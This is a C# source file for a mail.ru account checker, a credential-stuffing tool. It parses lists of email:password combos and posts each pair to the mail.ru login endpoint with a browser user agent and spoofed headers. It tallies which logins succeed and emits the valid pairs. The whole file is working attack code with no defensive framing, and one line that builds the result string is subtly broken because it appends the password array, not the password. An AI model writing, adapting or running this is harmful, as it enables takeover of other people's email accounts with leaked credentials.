using System;
using System.Linq;
using xNet;
namespace ChekerMail
{
    sealed class Accounts
    {
        public event Action <String> result;
        public event Action<Int32, Int32, Int32, Int32> G_B_inP_P;
        private Int32 _procesed = 0;
        private Int32 _inProcessed;
        private Int32 _g =0;
        private Int32 _b =0;

        private string[] _mail;
        private string[] _pass;
        public Accounts(string[] acc)
        {
            AddArray(acc);
        }
        public Accounts() { }

        //Разделяй и влавствуй
        private void AddArray(string[] value) 
        {
            _mail = new string[value.Length];
            _pass = new string[value.Length];
            string[] val = new string [2];
            for (int i = 0; i < value.Length; i++)
            {
                if (value[i].Contains(';') || value[i].Contains('|'))
                {
                    val = value[i].Replace(';', ':').Replace('|', ':').Split(':');
                }
                else 
                {
                    val = value[i].Split(':');
                }
                _mail[i] = val[0];
                _pass[i] = val[1];
            } 
            val = null;
        }
        public String AddLabelProcess() => _mail.Length.ToString();
        

        public void Start()
        {
            using (var request = new HttpRequest())
            {
                _inProcessed = _mail.Length;
                for (int i = 0; i < _mail.Length; i++)
                {
                    request.Cookies = new CookieDictionary();
                    request.KeepAlive = true;
                    request.AddHeader("Referer", "https://account.mail.ru/");
                    request.AddHeader("Origin", "https://account.mail.ru");
                    var urlParams = new RequestParams();
                    urlParams["Login"] = _mail[i];
                    urlParams["Password"] = _pass[i];
                    urlParams["page"] = "https://my.mail.ru/?app_id_mytracker=undefined&authid=l48ahmds.bp&dwhsplit=s10273.b1ss12743a1s&from=login&mt_click_id=mt-v6h9q7-1654855918-1811863716&mt_sub1=mail.ru&mt_sub5=1&utm_campaign=my.mail.ru&utm_medium=new_portal_navigation&utm_source=portal";
                    request.UserAgent = Http.FirefoxUserAgent();
                    string responce = request.Post("https://auth.mail.ru/cgi-bin/auth", urlParams, true).ToString();
                    if (responce != null)
                    {
                        if (responce.Contains("window-loading")) 
                        {
                            _g++;
                            _inProcessed--;
                            _procesed++;
                            G_B_inP_P?.Invoke(_g, _b, _inProcessed, _procesed);
                            string res = _mail[i] + "::" + _pass;
                            result?.Invoke(res);
                        }
                        if (!responce.Contains("window-loading")) 
                        {
                            _b++;
                            _inProcessed--;
                            _procesed++;
                            G_B_inP_P?.Invoke(_g, _b, _inProcessed, _procesed);
                        }
                    }
                }
            }
        }
    }
}
